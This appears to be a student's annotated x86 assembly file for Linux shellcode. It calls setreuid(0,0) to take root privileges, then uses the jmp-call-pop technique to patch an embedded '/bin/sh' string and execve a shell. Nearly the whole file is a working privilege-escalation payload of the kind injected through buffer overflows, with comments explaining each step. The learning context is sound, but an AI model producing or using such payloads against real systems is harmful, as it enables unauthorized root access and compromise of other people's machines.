BITS 32;

xor eax, eax		;parm 70 into eax, syscall #70. First zero the register
mov al, 70			;set low order byte to eax to 70, x46, and 3 high ordbytes=0
xor ebx, ebx		;param 0 in ebx, set real uid to root
xor ecx, ecx		;param 0 into ecx, set effective uid to root
int 0x80			;interrupt kernel

;obtain address of attack string for modification
jmp short trick
sucker:
    pop ebx			;contains address of attack string to modify

;execve(const char *filename, char *const argv [], char *const envp[])
xor eax, eax		;follow calling conventions for execve
mov [ebx+7], al		;replace X in string with null (after /bin/sh) tening attack
					;7 bytes offset from the beginning
mov [ebx+8], ebx	;replace 4 bytes "AAAA" with address of the attack
					;string offset 8 bytes from ebx
mov [ebx+12], eax  	;terminate string w/NULL address (4 bytes of 0)
					;replacing BBBB(12 bytes offset)
mov al, 11			;execve syscall #11 eax = 00 00 00 00. change 00 00 00 11
lea ecx, [ebx+8]	;exc has address where AAAA was the string
lea edx, [ebx+12]	;address of Null where BBBB was in the string
mov eax, 11			;execve is syscall #11
int 0x80
trick:
	call sucker	  ;push address of attack code into stack, then branch to sucker
	db '/bin/shXAAAABBBB'; attack code to modify
